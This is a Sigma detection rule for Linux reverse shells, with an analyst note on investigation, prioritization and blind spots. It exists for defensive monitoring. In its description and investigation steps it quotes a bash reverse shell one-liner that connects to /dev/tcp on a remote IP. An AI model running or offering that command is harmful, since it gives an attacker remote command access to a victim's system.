title: Linux Reverse Shell Indicator
id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
status: test
description: Detects a bash contecting to a remote IP address (often found when 
  actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
references:
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
author: Florian Roth (Nextron Systems)
date: 2021-10-16
modified: 2022-12-25
tags:
- attack.execution
- attack.t1059.004
logsource:
  product: linux
  category: network_connection
detection:
  selection:
    Image|endswith: '/bin/bash'
  filter:
    DestinationIp:
    - '127.0.0.1'
    - '0.0.0.0'
  condition: selection and not filter
falsepositives:
- Unknown
level: critical
note: |
  ### Technical Context

  This Sigma rule detects instances of the bash shell attempting to establish a network connection to a remote IP address, indicating potential reverse shell activity. The attacker’s objective is typically to gain unauthorized command line access to the victim's system, allowing for further exploitation or data exfiltration. This behavior falls under the MITRE ATT&CK framework's Execution tactic, specifically Technique T1059.004, which focuses on command and scripting interpreter execution.

  The primary telemetry source for this detection is Linux network connection logs, with the key log artifacts being details of outbound connections initiated by bash. If malicious, this activity can lead to significant security incidents, including unauthorized access and data breaches. Importantly, this detection does NOT confirm successful exploitation; it only indicates an attempt to connect to a potentially unauthorized destination.

  ### Investigation Steps

  - **Identify the process initiating the connection:** Review network connection logs (e.g., `/var/log/syslog` or `journalctl`) for bash processes (PID, command line arguments) that match the alert. Look specifically for command lines similar to `bash -i >& /dev/tcp/<remote_ip>/<port> 0>&1`.

  - **Check for known malicious IP addresses:** Correlate the destination IP address against threat intelligence feeds for known malicious IPs. Look for connections to IPs that have been flagged in previous compromises.

  - **Review recent system changes:** Query logs to identify any recent, unexpected changes to user permissions or installation of new software (e.g., package manager logs). This will help identify potential vectors that led to the reverse shell.

  - **Investigate legitimate use cases:** Validate if bash was intentionally executed by legitimate users for administrative tasks. Review the context around the discovered connection, such as historical user activity and whether it aligns with expected behavior in the environment.

  - **Correlate with outbound traffic:** Examine firewall logs (e.g., `iptables`, `ufw`) for outbound traffic matches to the detected IP and port. Determine if there are other unusual outgoing connections in the timeframe that indicate non-standard behavior.

  - **Verify persistence mechanisms:** If a reverse shell is confirmed, scan for other indicators of compromise, including unusual startup scripts or cron jobs, that may indicate an attempt to maintain access. Check directories like `/etc/init.d/` or execution agents like `systemd` units.

  ### Prioritization

  This alert is critical due to the potential impact of a successful reverse shell, which may allow adversaries to access sensitive systems and data, potentially leading to larger breaches. The likelihood of malicious abuse is high, as reverse shells are common tactics used by attackers during post-exploitation phases. The behavior detected is frequently exploited in various attack campaigns.

  ### Blind Spots and Assumptions

  Detection may miss activities that obfuscate the execution of bash, such as using alternative shells or employing encryption in the connection. Additionally, the rule presumes logs from the network connections are properly captured and retained. Legitimate administrative scripts or automated processes using bash could inadvertently trigger this alert. A related detection to strengthen coverage includes monitoring for unusual process creation associated with networking activity, such as Sysmon Event ID 1 with parameters for connection attempts initiated by shell processes.

